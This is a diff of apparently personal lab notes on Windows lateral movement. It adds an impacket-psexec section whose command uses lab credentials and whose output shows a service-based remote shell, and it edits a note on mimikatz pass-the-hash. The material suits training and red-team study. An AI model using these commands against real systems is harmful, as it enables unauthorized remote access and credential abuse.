@@ -186,7 +186,9 @@ Started: Wed Dec  7 07:54:16 2022
 Stopped: Wed Dec  7 07:54:44 2022
 ```
 
-## 1.5. Connect to target using evil-winrm
+## 1.5. Connect to target
+
+### 1.5.1. Using evil-winrm
 
 - WinRM `5985` must be enabled on the target
 - User must be a member of `Remote Management Users` on the target
@@ -204,6 +206,26 @@ Stopped: Wed Dec  7 07:54:44 2022
 Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\mike\Documents>
+```
+
+### 1.5.2. Using impacket-psexec
+
+The user must be administrator on the target because PsExec uses the `ADMIN$` to run the service manager
+
+```console
+┌──(root㉿kali)-[~]
+└─# impacket-psexec lab.vx/mike:P@ssw0rd@192.168.17.11
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on 192.168.17.11.....
+[*] Found writable share ADMIN$
+[*] Uploading file UJIrOtIJ.exe
+[*] Opening SVCManager on 192.168.17.11.....
+[*] Creating service AXhI on 192.168.17.11.....
+[*] Starting service AXhI.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.1129]
+(c) 2016 Microsoft Corporation. All rights reserved.
 ```
 
 # 2. Cached Credential Storage and Retrieval
@@ -534,7 +556,7 @@ NTLM    : e19ccf75ee54e06b06a5907af13cef42
 ```
 
 - Connect to the target machine in the new cmd window
-- ☝️ **Note**: `sekurlsa::pth` for local accounts must use the built-in `administrator` account, because only PsExec uses the `ADMIN$` to run the new cmd
+- ☝️ **Note**: `sekurlsa::pth` for local accounts must use the built-in `administrator` account, because PsExec uses the `ADMIN$` to run the new cmd
 
 ```cmd
 C:\Windows\system32>whoami
